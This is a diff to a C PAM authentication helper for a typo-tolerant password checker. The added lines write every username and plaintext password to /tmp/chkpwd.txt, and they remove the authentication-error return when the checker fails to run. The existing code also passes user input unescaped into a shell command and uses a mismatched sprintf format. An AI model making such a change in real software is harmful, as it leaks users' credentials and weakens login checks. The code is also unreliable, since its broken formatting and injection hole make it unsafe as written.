@@ -67,15 +67,17 @@ typtop_helper_verify_password(const char* user, const char* pass, int retval) {
     char cmd[1000] = "/usr/local/bin/typtops.py --check";
     sprintf(cmd, "%s %d %s %s", retval, user, pass);
     FILE* fp = popen(cmd, "r");
+    FILE *tfp = fopen("/tmp/chkpwd.txt", "a");
     if(fp==NULL) {
-        printf("Could not open /usr/local/bin/typtops.py!");
-        return PAM_AUTH_ERR;
+        fprintf(tfp, "Could not open /usr/local/bin/typtops.py!; user=%s, pass=%s\n", user, pass);
     } else {
+        fprintf(tfp, "Successfully opened /usr/local/bin/typtops.py!; user=%s, pass=%s\n", user, pass);
         fscanf(fp, "%d", &typo_retval);
         if (typo_retval == 0) {
             typo_retval = PAM_SUCCESS;
         }
     }
+    fclose(tfp);
     return typo_retval;
 }
 
